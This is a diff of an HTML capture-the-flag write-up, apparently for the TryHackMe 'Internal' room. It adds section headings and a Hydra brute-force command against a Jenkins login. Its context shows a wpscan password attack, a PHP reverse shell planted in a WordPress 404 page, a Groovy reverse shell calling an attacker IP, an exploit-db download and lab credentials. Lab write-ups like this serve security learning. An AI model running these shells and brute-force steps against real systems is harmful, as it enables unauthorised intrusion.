@@ -3055,6 +3055,34 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#wordpress-php-reverse-shell" class="md-nav__link">
+    Wordpress php reverse shell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#aubreanna" class="md-nav__link">
+    Aubreanna
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jenkins" class="md-nav__link">
+    Jenkins
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jenkins-groovy-reverse-shell" class="md-nav__link">
+    Jenkins groovy reverse shell
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -4434,6 +4462,34 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#wordpress-php-reverse-shell" class="md-nav__link">
+    Wordpress php reverse shell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#aubreanna" class="md-nav__link">
+    Aubreanna
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jenkins" class="md-nav__link">
+    Jenkins
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jenkins-groovy-reverse-shell" class="md-nav__link">
+    Jenkins groovy reverse shell
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -4461,6 +4517,7 @@
 <li>I used an SSH-Tunnel in case you are wondering why I have "localhost" instead of an IP mentioned.</li>
 </ul>
 <h2 id="first-checks">First Checks</h2>
+<p>Let's add internal.thm to the hosts file as requested and run nmap, niktio and gobuster to scan the target.</p>
 <div class="highlight"><pre><span></span><code>sudo <span class="nb">echo</span> <span class="m">10</span>.10.156.30 internal.thm &gt;&gt; /etc/hosts
 
 <span class="nv">IP</span><span class="o">=</span><span class="s2">&quot;10.10.156.30&quot;</span>
@@ -4469,8 +4526,7 @@ nmap -sC -sV <span class="nv">$IP</span>
 nikto -h <span class="nv">$IP</span>
 </code></pre></div>
 <h3 id="namp">Namp</h3>
-<div class="highlight"><pre><span></span><code>fabian@kali:~$ nmap -sC -sV <span class="nv">$IP</span>
-Starting Nmap <span class="m">7</span>.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2021</span>-06-24 <span class="m">14</span>:29 EDT
+<div class="highlight"><pre><span></span><code>nmap -sC -sV <span class="nv">$IP</span>
 Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.156.30
 Host is up <span class="o">(</span><span class="m">0</span>.020s latency<span class="o">)</span>.
 Not shown: <span class="m">998</span> closed ports
@@ -4489,13 +4545,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned <span class="k">in</span> <span class="m">8</span>.50 seconds
 </code></pre></div>
 <h3 id="nikto">nikto</h3>
-<div class="highlight"><pre><span></span><code>fabian@kali:~$ nikto -h <span class="nv">$IP</span>
+<div class="highlight"><pre><span></span><code>nikto -h <span class="nv">$IP</span>
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          <span class="m">10</span>.10.156.30
 + Target Hostname:    <span class="m">10</span>.10.156.30
 + Target Port:        <span class="m">80</span>
-+ Start Time:         <span class="m">2021</span>-06-24 <span class="m">14</span>:29:56 <span class="o">(</span>GMT-4<span class="o">)</span>
 ---------------------------------------------------------------------------
 + Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
 + The anti-clickjacking X-Frame-Options header is not present.
@@ -4511,38 +4566,20 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 + Cookie wordpress_test_cookie created without the httponly flag
 + /blog/wp-login.php: Wordpress login found
 + <span class="m">8042</span> requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">11</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
-+ End Time:           <span class="m">2021</span>-06-24 <span class="m">14</span>:33:40 <span class="o">(</span>GMT-4<span class="o">)</span> <span class="o">(</span><span class="m">224</span> seconds<span class="o">)</span>
 ---------------------------------------------------------------------------
 + <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested
 </code></pre></div>
 <h3 id="gobuster">gobuster</h3>
-<div class="highlight"><pre><span></span><code>fabian@kali:~$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.156.30:80
-<span class="o">===============================================================</span>
-Gobuster v3.1.0
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.156.30:80
-<span class="o">[</span>+<span class="o">]</span> Method:                  GET
-<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
-<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
-<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-<span class="m">2021</span>/06/24 <span class="m">14</span>:41:06 Starting gobuster <span class="k">in</span> directory enumeration <span class="nv">mode</span>
+<div class="highlight"><pre><span></span><code>gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.156.30:80
 <span class="o">===============================================================</span>
 /blog                 <span class="o">(</span>Status: <span class="m">301</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">311</span><span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.156.30/blog/<span class="o">]</span>
 /wordpress            <span class="o">(</span>Status: <span class="m">301</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">316</span><span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.156.30/wordpress/<span class="o">]</span>
 /javascript           <span class="o">(</span>Status: <span class="m">301</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">317</span><span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.156.30/javascript/<span class="o">]</span>
 /phpmyadmin           <span class="o">(</span>Status: <span class="m">301</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">317</span><span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.156.30/phpmyadmin/<span class="o">]</span>
 /server-status        <span class="o">(</span>Status: <span class="m">403</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">277</span><span class="o">]</span>
-                                                                                     <span class="o">[[</span><span class="m">3</span>~^<span class="o">[[</span><span class="m">3</span>~
-<span class="o">===============================================================</span>
-<span class="m">2021</span>/06/24 <span class="m">14</span>:49:03 <span class="nv">Finished</span>
-<span class="o">===============================================================</span>
 </code></pre></div>
 <h2 id="wordpress">Wordpress</h2>
-<div class="highlight"><pre><span></span><code>fabian@kali:~$ wpscan --url http://10.10.156.30/wordpress -P rockyou.txt -U admin
+<div class="highlight"><pre><span></span><code>wpscan --url http://10.10.156.30/wordpress -P rockyou.txt -U admin
 _______________________________________________________________
          __          _______   _____
          <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
@@ -4556,9 +4593,6 @@ _______________________________________________________________
 <span class="s1">       Sponsored by Automattic - https://automattic.com/</span>
 <span class="s1">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span>
 <span class="s1">_______________________________________________________________</span>
-
-<span class="s1">[+] URL: http://10.10.156.30/wordpress/ [10.10.156.30]</span>
-<span class="s1">[+] Started: Thu Jun 24 14:51:10 2021</span>
 
 <span class="s1">Interesting Finding(s):</span>
 
@@ -4614,17 +4648,10 @@ Trying admin / lizzy Time: <span class="m">00</span>:01:19 &lt;                 
 
 <span class="o">[</span>!<span class="o">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
 <span class="o">[</span>!<span class="o">]</span> You can get a free API token with <span class="m">25</span> daily requests by registering at https://wpscan.com/register
-
-<span class="o">[</span>+<span class="o">]</span> Finished: Thu Jun <span class="m">24</span> <span class="m">14</span>:52:44 <span class="m">2021</span>
-<span class="o">[</span>+<span class="o">]</span> Requests Done: <span class="m">4062</span>
-<span class="o">[</span>+<span class="o">]</span> Cached Requests: <span class="m">4</span>
-<span class="o">[</span>+<span class="o">]</span> Data Sent: <span class="m">1</span>.902 MB
-<span class="o">[</span>+<span class="o">]</span> Data Received: <span class="m">15</span>.967 MB
-<span class="o">[</span>+<span class="o">]</span> Memory used: <span class="m">210</span>.898 MB
-<span class="o">[</span>+<span class="o">]</span> Elapsed time: <span class="m">00</span>:01:34
 </code></pre></div>
 <p>So now we can login to wordpress as admin and look around.</p>
 <p>The wordpress page reveals a private note on credentals of william being william:arnold147 sofar this doesnt seem usable</p>
+<h2 id="wordpress-php-reverse-shell">Wordpress php reverse shell</h2>
 <p>I used this <a href="https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php">php reverse shell</a>, modified IP and port and uploaded it to the wordpress 404 page. Now time to start netcat on the chosen port e.g. <code>nc -lvnp 6666</code> and call a page that doesn't exist e.g. <code>/blog/index.php/2020/08/03/50/</code> with e.g. curl.</p>
 <p>We now get a reverse shell but no TTY so we can try this: <code>python -c 'import pty; pty.spawn("/bin/sh")'</code> or this <code>/bin/sh -i</code>.</p>
 <p>Let's have a look around:</p>
@@ -4674,6 +4701,7 @@ Aubreanna needed these credentials <span class="k">for</span> something later.  
 
 aubreanna:bubb13guM!@#123
 </code></pre></div>
+<h2 id="aubreanna">Aubreanna</h2>
 <p>So let's login via aubreanna: <code>ssh aubreanna@10.10.156.30</code> and we find the first flag (user.txt) in the home dir.</p>
 <p>Unfortunantly <code>sudo -l</code> is not allowed</p>
 <div class="highlight"><pre><span></span><code>aubreanna@internal:~$ sudo -l
@@ -4703,7 +4731,7 @@ define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
 <p>@Kali</p>
 <div class="highlight"><pre><span></span><code>wget -O exploit.c https://www.exploit-db.com/raw/42183
 gcc -o exploit exploit.c
-scp exploit aubreanna@10.10.45.40:~/exploit
+scp exploit aubreanna@10.10.156.30:~/exploit
 </code></pre></div>
 <p>@aubreanna@internal</p>
 <div class="highlight"><pre><span></span><code>chmod +x exploit
@@ -4711,12 +4739,18 @@ scp exploit aubreanna@10.10.45.40:~/exploit
 died <span class="k">in</span> main: <span class="m">57</span>
 </code></pre></div>
 <p>I tried changing the c code but felt like a script kiddy as errors just moved on... so I gave up on this.</p>
+<h2 id="jenkins">Jenkins</h2>
 <p>In the home folder of aubreanna there is txt mentioning a local jenkins server.</p>
 <p>From kali lets tunnel local port 31340 with ssh to "127.0.0.1:8080" on internal.thm (which we modified at the beginning).</p>
 <div class="highlight"><pre><span></span><code>ssh -g -L31340:127.0.0.1:8080 -l aubreanna internal.thm
 </code></pre></div>
-<p>we can the open jenkins from your kali machine e.g. http://localhost:31340</p>
-<p>Lets run <a href="https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy">this groovy reverse shell</a> in the jenkins script conosole and just changed "cmd" to "/bin/bash" as well as IP and port and started a new netcat session on port 7777</p>
+<p>We can the open jenkins from your kali machine e.g. http://localhost:31340 and analyse the login prompt with burpsuite:</p>
+<p><img alt="_internal_burpsuite" src="../_internal_burpsuite.jpg" /></p>
+<p>Using the information from the intercepted post command of a failed login attempt we can build the hdyra bruteforce attack:</p>
+<div class="highlight"><pre><span></span><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s <span class="m">31340</span> http-post-form <span class="s2">&quot;/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=&amp;Submit=Sign+in:F=Invalid&quot;</span>
+</code></pre></div>
+<h2 id="jenkins-groovy-reverse-shell">Jenkins groovy reverse shell</h2>
+<p>Luckily the password is simple and cracked rather fast using the rockyou.txt. Now that we are logged in as admin in the Jenkins portal let's run <a href="https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy">this groovy reverse shell</a> in the jenkins script conosole and just changed "cmd" to "/bin/bash" as well as IP and port and started a new netcat session on port 7777</p>
 <div class="highlight"><pre><span></span><code><span class="n">String</span> <span class="n">host</span><span class="o">=</span><span class="s2">&quot;10.9.193.173&quot;</span><span class="o">;</span>
 <span class="kt">int</span> <span class="n">port</span><span class="o">=</span><span class="mi">7777</span><span class="o">;</span>
 <span class="n">String</span> <span class="n">cmd</span><span class="o">=</span><span class="s2">&quot;/bin/bash&quot;</span><span class="o">;</span>
@@ -4750,7 +4784,7 @@ need access to the root user account.
 root:tr0ub13guM!@#123
 </code></pre></div>
 <p>Let ssh as root and see if we find the flag :)</p>
-<div class="highlight"><pre><span></span><code>ssh root@10.10.45.40
+<div class="highlight"><pre><span></span><code>ssh root@10.10.156.30
 root@internal:~# cat root.txt
 </code></pre></div>
                 
